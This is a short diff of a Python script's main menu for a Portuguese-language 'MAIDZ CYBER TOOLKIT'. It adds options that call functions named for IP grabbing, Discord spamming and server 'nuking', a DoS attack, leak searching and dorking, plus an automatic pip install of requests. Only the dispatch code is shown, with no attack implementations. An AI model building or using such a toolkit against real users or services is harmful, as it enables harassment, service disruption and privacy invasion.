         if opcao == "1":
             dorking_menu()
-    
+        elif opcao == "2":
+            ip_grabber()
+        elif opcao == "3":
+            ip_pinger()
+        elif opcao == "4":
+            discord_account_shower()
+        elif opcao == "5":
+            osint_searcher()
+        elif opcao == "6":
+            leaks_searcher()
+        elif opcao == "7":
+            discord_spammer()
+        elif opcao == "8":
+            discord_nuker()
+        elif opcao == "9":
+            discord_username_checker()
+        elif opcao == "10":
+            dorking_tools()
+        elif opcao == "11":
+            tiktok_name_searcher()
+        elif opcao == "12":
+            dos_attack()
+        elif opcao == "13":
+            print("Saindo do MAIDZ CYBER TOOLKIT...")
+            sys.exit(0)
+        else:
+            print("Opção inválida!")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        # Garante que requests está instalado
+        try:
+            import requests
+        except ImportError:
+            print("Instalando requests...")
+            os.system("pip install requests")
+        # Executa o main
+        main()
+    except KeyboardInterrupt:
+        print("\nSaindo...")
+        sys.exit(0)
